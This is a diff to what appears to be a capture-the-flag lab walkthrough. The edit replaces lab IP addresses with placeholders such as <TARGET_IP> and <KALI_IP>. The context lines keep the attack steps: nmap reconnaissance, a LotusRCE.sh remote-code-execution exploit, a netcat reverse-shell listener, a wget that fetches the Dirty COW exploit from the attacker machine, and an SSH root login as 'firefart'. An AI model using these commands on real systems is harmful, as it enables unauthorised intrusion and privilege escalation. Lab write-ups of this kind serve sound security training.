@@ -19,7 +19,7 @@ sudo netdiscover
 From the output, we identify the target IP address:
 
 ```
-192.168.56.104
+<TARGET_IP>
 ```
 
 ---
@@ -29,7 +29,7 @@ From the output, we identify the target IP address:
 Next, we perform service and version detection:
 
 ```bash
-nmap -A -T4 192.168.56.104
+nmap -A -T4 <TARGET_IP>
 ```
 
 Key findings:
@@ -47,7 +47,7 @@ The presence of a web server on port 80 is our primary attack surface.
 We navigate to:
 
 ```
-http://192.168.56.104
+http://<TARGET_IP>
 ```
 
 We observe an `index.php` page.
@@ -76,7 +76,7 @@ chmod +x LotusRCE.sh
 Run the exploit:
 
 ```bash
-./LotusRCE.sh http://192.168.56.104/index.php
+./LotusRCE.sh http://<TARGET_IP>/index.php
 ```
 
 ---
@@ -95,7 +95,7 @@ nc -lvnp 1234
 
 Inside LotusRCE:
 
-- Enter Kali IP address
+- Enter <KALI_IP> address
 - Enter Port: 1234
 - Choose option `1`
 
@@ -157,7 +157,7 @@ On the target machine:
 
 ```bash
 cd /tmp
-wget http://192.168.56.X:8000/dirty.c
+wget http://<KALI_IP>:8000/dirty.c
 ```
 
 ---
@@ -219,7 +219,7 @@ uid=0(root) gid=0(root)
 We can now log in via SSH:
 
 ```bash
-ssh firefart@192.168.56.104 -oHostKeyAlgorithms=+rsa
+ssh firefart@<TARGET_IP> -oHostKeyAlgorithms=+rsa
 ```
 
 Enter password:
